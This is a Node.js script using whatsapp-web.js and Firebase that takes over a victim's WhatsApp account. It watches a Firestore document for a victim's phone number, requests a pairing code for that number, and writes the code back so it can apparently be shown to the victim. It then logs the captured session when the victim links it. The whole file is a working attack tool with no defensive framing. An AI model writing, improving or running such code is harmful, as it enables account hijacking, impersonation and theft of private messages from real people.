const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        executablePath: '/usr/bin/google-chrome-stable',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu'
        ]
    }
});

// Bloquear recursos innecesarios para ahorrar RAM en Render
async function optimizarPagina(page) {
    await page.setRequestInterception(true);
    page.on('request', (ds) => {
        if (['image', 'stylesheet', 'font', 'media'].includes(ds.resourceType())) {
            ds.abort();
        } else {
            ds.continue();
        }
    });
}

db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("PROCESANDO: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("EXITO: " + code);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
        } catch (e) {
            console.log("ERROR: " + e.message);
            await snap.ref.update({ status: "error" });
        }
    }
});

client.on('ready', () => {
    console.log("SESIÓN CAPTURADA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();
http.createServer((req, res) => { res.end('ONLINE'); }).listen(process.env.PORT || 3000);
